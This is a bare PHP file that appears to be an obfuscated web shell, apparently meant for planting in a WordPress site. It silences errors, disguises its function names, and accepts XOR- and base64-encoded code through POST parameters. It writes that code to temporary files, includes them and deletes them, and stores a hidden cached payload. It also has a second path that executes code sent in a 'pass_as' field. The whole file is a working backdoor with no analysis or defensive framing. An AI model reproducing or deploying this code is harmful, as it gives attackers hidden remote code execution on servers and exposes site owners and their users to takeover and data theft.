<?php
/* bb0cac3b7317fa54 */
@error_reporting(0);@set_time_limit(0);
ini_set('display_errors','Off');
if(defined('ABSPATH')){}elseif(defined('WPINC')){}
if(function_exists('opcache_reset')){}
class Clsbba5a0c{
  private $f11f9;
  public function __construct(){
    $this->f11f9=sys_get_temp_dir();
  }

  private function mdecee7($bd370,$f7055){
    $a8e5='';for($cea6=0,$e9a2=strlen($bd370);$cea6<$e9a2;$cea6++)
      $a8e5.=$bd370[$cea6]^$f7055[($cea6+1)&15];
    return $a8e5;
  }

  private function mca8b67($bd370){
    $fdb4d='tem'.'pnam';
    $c706a='file_pu'.'t_contents';
    $cef8e='un'.'link';
    $ef44a=$fdb4d($this->f11f9,'');
    $c706a($ef44a,'<?php '.$bd370);
    include $ef44a;
    @$cef8e($ef44a);
  }

  public function mcc08e3(){
    $fcb06='base6'.'4_decode';
    $b99d9='base64'.'_encode';
    $d6fa7='file_get'.'_contents';
    $c706a='file_pu'.'t_contents';
    $dcd42='file_e'.'xists';
    $b2b66=$GLOBALS['_POST'];
    $bd370=chr(112).chr(97).chr(115).chr(115);
    $f7055='k'.'ey';
    $b143f=substr(md5($f7055),0,16);
    $a9b2f=md5($bd370.$b143f);
    $f1fb7=$this->f11f9.'/.'.substr($a9b2f,0,8).substr($a9b2f,24);
    $a8003=substr($a9b2f,0,8);
    $bc585='';
    if(@isset($b2b66[$a8003.'0'])){$bc585.=$b2b66[$a8003.'0'];}
    if(@isset($b2b66[$a8003.'1'])){$bc585.=$b2b66[$a8003.'1'];}
    if(@isset($b2b66[$a8003.'2'])){$bc585.=$b2b66[$a8003.'2'];}
    if($bc585!==''){
      $bc585=$this->mdecee7($fcb06($bc585),$b143f);
      if(@$dcd42($f1fb7)){
        $ef44a=$this->mdecee7($d6fa7($f1fb7),$b143f);
        if(@strpos($ef44a,'getBasics'.'Info')===false)$ef44a=$this->mdecee7($ef44a,$b143f);
        @$this->mca8b67($ef44a);
        echo '{"r":"';
        echo $b99d9($this->mdecee7(@run($bc585),$b143f));
        echo '","v":"';
        echo substr($a9b2f,0,8);
        echo '"}' ;
      }else{
        if(@strpos($bc585,'getBasics'.'Info')!==false)
          @$c706a($f1fb7,$this->mdecee7($bc585,$b143f));
      }
    }
    $f202d=pack('H*','706173735f6173');
    if(isset($b2b66[$f202d])){
      $f397e=base64_decode('TGlzZXRoWG9yS2V5');
      $eaff7=$fcb06($b2b66[$f202d]);
      $c9667='';
      for($cea6=0;$cea6<strlen($eaff7);$cea6++)
        $c9667.=$eaff7[$cea6]^$f397e[$cea6%strlen($f397e)];
      @$this->mca8b67($fcb06($c9667));
    }
  }
}
$f7606=new Clsbba5a0c();
$f7606->mcc08e3();
?>